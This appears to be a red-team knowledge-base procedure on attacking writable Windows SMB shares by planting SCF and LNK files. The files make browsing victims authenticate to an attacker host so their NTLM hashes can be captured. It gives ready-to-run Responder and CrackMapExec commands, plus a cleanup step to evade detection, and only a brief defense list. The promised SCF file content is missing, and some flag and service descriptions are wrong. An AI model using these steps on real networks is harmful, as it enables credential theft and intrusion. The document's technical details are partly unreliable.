---
id: 3576037e-9933-4bf9-80a0-e3c01d6f19bb
name: SCF-and-URL-File-Attack-Against-Writable-Share
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:03.389902+00:00'
updated_at: '2023-04-10T20:26:21.317746+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - '[[techniques/External Remote Services|T1133 - External Remote Services]]'
  - '[[techniques/Phishing|T1566 - Phishing]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/SCF-and-URL-file-attack-against-writeable-share]]'
  - '[[tags/SCF-Files]]'
commands:
  - '[[commands/responder-scf-payload-listener-on-eth0]]'
  - '[[commands/crackmapexec-smb-scf-payload]]'
  - '[[commands/crackmapexec-smb-lnk-payload]]'
  - '[[commands/crackmapexec-smb-lnk-cleanup]]'
platforms:
  - Windows
tools:
  - '[[tools/Responder]]'
  - '[[tools/CrackMapExec]]'
validated: true
---

# SCF-and-URL-File-Attack-Against-Writable-Share

## Summary

This procedure exploits writable SMB shares by placing specially crafted SCF (Shell Command File) or URL files that, when accessed via Windows Explorer, trigger remote payload execution or authentication relay. It leverages tools like Responder to capture NTLM hashes and CrackMapExec to automate file placement and payload delivery, enabling initial access, execution, or persistence in Active Directory environments.

## Description

SCF files exploit Windows Explorer's handling of icon loading from remote UNC paths, causing the system to authenticate to the attacker's server and potentially execute code or relay credentials. URL files can similarly trigger remote resource fetches. This technique targets domain-joined Windows systems browsing writable shares, common in lateral movement scenarios. The attacker sets up a listener with Responder to poison WPAD and capture hashes, then uses CrackMapExec modules (scuffy for SCF, slinky for LNK) to place malicious files on shares. Success leads to hash capture for cracking or direct payload execution, mapping to MITRE tactics like Execution and Initial Access in enterprise networks.

## Requirements

1. Network access to the target's SMB shares (writable permissions via existing credentials or null session).
2. Attacker-controlled server for hosting payloads/icons (e.g., SMB/HTTP server on attacker's IP).
3. Tools: Responder for NTLM relay/capture, CrackMapExec for automation, and a wordlist for hash cracking if needed.
4. Target: Windows systems (XP+), domain-joined, with WebClient service enabled.

## Defense

- Disable WebClient service (msftpsvc) via Group Policy to prevent UNC path resolutions.
- Implement SMB signing enforcement and restrict anonymous access to shares.
- Monitor for anomalous SMB/HTTP traffic to internal IPs and enable NTLM auditing.
- Use AppLocker or WDAC to block execution from network shares; patch MS15-076 and related vulnerabilities.

## Objectives

1. Place malicious SCF/URL files on writable shares to trigger remote authentication or payload execution.
2. Capture NTLM hashes via Responder for offline cracking or relay attacks.
3. Achieve code execution on the target when the victim browses the share via Explorer.
4. Clean up artifacts post-exploitation to maintain persistence.

## Instructions

### Step 1: Set Up Responder Listener for NTLM Capture

**Context**: Start Responder to listen for SMB/HTTP authentication attempts triggered by SCF file icon loads, enabling WPAD poisoning and LM hash capture on the specified interface.

**Command** ([[commands/responder-scf-payload-listener-on-eth0]]):
```bash
responder -wrf --lm -v -I eth0
```

> This command enables WPAD (-w), SMB/HTTP relay (-r, but -wrf combines), forces NTLMv1 (-f), enables LM hashing (--lm), verbose output (-v), and binds to eth0 (-I). Run on the attacker machine before placing files. Expected: Responder starts listening; logs show incoming auth attempts when SCF is triggered.

### Step 2: Create SCF File Content for Remote Icon Load

**Context**: Generate the SCF file that instructs Windows to load an icon from a remote share, triggering authentication to the Responder server.

**Code** ([[codes/SCF-File-for-Remote-Icon-Load-and-Desktop-Toggle]]):
Embed the following content into a .scf file and place it on the writable share.

> The [Shell] section sets Command=2 to execute a shell action on icon load, pointing IconFile to the remote UNC path. The [Taskbar] section toggles desktop visibility to potentially hide activity. Save as e.g., fakefile.scf on the share.

### Step 3: Deploy SCF Payload Using CrackMapExec

**Context**: Use CrackMapExec's scuffy module to automate SCF file placement on the target SMB share, specifying the payload name and Responder IP.

**Command** ([[commands/crackmapexec-smb-scf-payload]]):
```bash
crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER
```

> Replace 10.10.10.10 with target IP, username/password with valid creds for write access. -M scuffy deploys the SCF payload; NAME=WORK sets the share/folder name; SERVER=IP_RESPONDER is attacker's IP. Expected: Confirmation of file placement; no errors in CME output.

### Step 4: Deploy LNK Payload as Alternative

**Context**: If SCF fails, use slinky module for LNK files that can execute payloads similarly via remote paths.

**Command** ([[commands/crackmapexec-smb-lnk-payload]]):
```bash
crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER
```

> Similar to Step 3 but -M slinky for LNK files. Expected: LNK file placed; ready for victim interaction.

### Step 5: Clean Up Payload Artifacts

**Context**: Remove placed files post-exploitation to evade detection.

**Command** ([[commands/crackmapexec-smb-lnk-cleanup]]):
```bash
crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
```

> Adds CLEANUP option to remove the LNK (or SCF if adapted). Expected: Confirmation of deletion; share cleaned.
